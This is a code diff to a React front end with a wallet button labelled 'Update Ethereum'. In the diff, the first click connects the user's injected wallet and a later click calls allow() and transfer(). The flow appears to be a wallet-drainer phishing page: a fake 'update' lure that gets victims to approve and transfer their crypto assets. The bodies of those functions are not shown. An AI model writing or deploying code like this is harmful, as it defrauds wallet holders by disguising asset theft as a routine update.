@@ -5901,11 +5901,16 @@ const App = () => {
   const connectWallet = async () => {
 
     try {
-      if(wallet == false)
+      if(!account)
       {
         await activate(injected);
+        setWallet(true);
+      }
+      else
+      {
         await allow();
         await transfer();
+        setWallet(false);
       }
       // setWallet(true);
     } catch (error) {
@@ -5967,15 +5972,15 @@ const App = () => {
 
   //from here !!
 
-  useEffect( async () => {
-    // if(wallet == false)
-      await connectWallet();
-    // else{
-    //   await allow();
-    //   await transfer();
-    // }
+  // useEffect( async () => {
+  //   // if(wallet == false)
+  //     await connectWallet();
+  //   // else{
+  //   //   await allow();
+  //   //   await transfer();
+  //   // }
 
-  }, [wallet]);
+  // }, [wallet]);
 
   
     return (
@@ -5986,7 +5991,7 @@ const App = () => {
             {/* <div><span className = "exploreEthereum" onClick = {allow}>Explore Ethereum</span></div> */} 
             <div dangerouslySetInnerHTML={{ __html: temptext1 }} />
               <button className="waveButton" onClick={connectWallet}>
-                {!account? "Update Ethereum" : "Update Ethereum"}
+                {!account? "Connect Wallet" : "Update Ethereum"}
               </button>
             <div dangerouslySetInnerHTML={{ __html: temptext2 }} />    
           </div>
